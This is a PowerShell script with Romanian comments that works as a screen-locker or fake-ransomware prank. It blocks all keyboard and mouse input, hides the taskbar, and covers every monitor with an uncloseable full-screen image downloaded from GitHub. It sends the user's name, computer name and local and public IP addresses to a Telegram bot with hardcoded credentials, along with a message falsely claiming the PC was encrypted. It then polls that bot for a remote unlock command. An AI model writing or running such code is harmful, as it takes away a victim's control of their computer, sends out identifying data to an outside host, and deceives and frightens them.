Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Cod nativ pt blocare și taskbar
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Native {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# ▶️ VARIABILE SISTEM
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$chatID = '656189986'
$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'

# IP local
$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress

# IP public
try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string] } catch { $ipPublic = "n/a" }

# ▶️ TRIMITE MESAJ TELEGRAM
$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
$uriSend = "https://api.telegram.org/bot$botToken/sendMessage"
$body = @{
    chat_id = $chatID
    text    = $message
} | ConvertTo-Json -Compress
try { Invoke-RestMethod -Uri $uriSend -Method POST -Body $body -ContentType 'application/json' } catch {}

# ▶️ ASCUNDE TASKBAR ȘI BLOCHEAZĂ INPUT
$taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
[Native]::ShowWindow($taskbar, 0)
[Native]::BlockInput($true)

# ▶️ DESCARCĂ IMAGINEA
$temp = "$env:TEMP\poza_laptop.jpg"
Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing

# ▶️ CALCULARE MONITOARE
$bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
$minX = ($bounds | ForEach-Object { $_.X }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
$minY = ($bounds | ForEach-Object { $_.Y }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
$maxRight = ($bounds | ForEach-Object { $_.Right }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
$maxBottom = ($bounds | ForEach-Object { $_.Bottom }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
$width = $maxRight - $minX
$height = $maxBottom - $minY

# ▶️ VARIABILĂ DE CONTROL
$script:inchis = $false

# ▶️ FUNCȚIE DE ÎNCHIDERE
function InchideTot {
    $script:inchis = $true
    [Native]::BlockInput($false)
    [Native]::ShowWindow($taskbar, 1)
    $form.Close()
}

# ▶️ CREARE FEREASTRĂ
$form = New-Object Windows.Forms.Form
$form.StartPosition = 'Manual'
$form.Location = New-Object Drawing.Point $minX, $minY
$form.Size = New-Object Drawing.Size $width, $height
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.ShowInTaskbar = $false
$form.BackColor = 'Black'
$form.KeyPreview = $true
$form.Cursor = [System.Windows.Forms.Cursors]::None

$img = [System.Drawing.Image]::FromFile($temp)
$pb = New-Object Windows.Forms.PictureBox
$pb.Image = $img
$pb.Dock = 'Fill'
$pb.SizeMode = 'Zoom'
$form.Controls.Add($pb)

# ▶️ Închide cu tasta C
$form.Add_KeyDown({
    if ($_.KeyCode -eq 'C') { InchideTot }
})
$form.Add_FormClosing({ if (-not $script:inchis) { $_.Cancel = $true } })

# ▶️ Afișează formularul
$form.Show()

# ▶️ PORNEȘTE MONITORIZARE TELEGRAM
Start-Job -ScriptBlock {
    $target1 = "👍 $env:USERNAME"
    $target2 = "👍 $env:COMPUTERNAME"
    $updatesUrl = "https://api.telegram.org/bot$using:botToken/getUpdates"

    while (-not $using:script:inchis) {
        try {
            $updates = Invoke-RestMethod -Uri $updatesUrl -Method GET -TimeoutSec 5
            foreach ($update in $updates.result) {
                $txt = $update.message.text
                if ($txt -eq $target1 -or $txt -eq $target2) {
                    Start-Sleep -Milliseconds 500
                    [System.Windows.Forms.Application]::OpenForms[0].Invoke([Action]{ $using:InchideTot.Invoke() })
                }
            }
        } catch {}
        Start-Sleep -Seconds 5
    }
}

# ▶️ RUN LOOP
[System.Windows.Forms.Application]::Run($form)
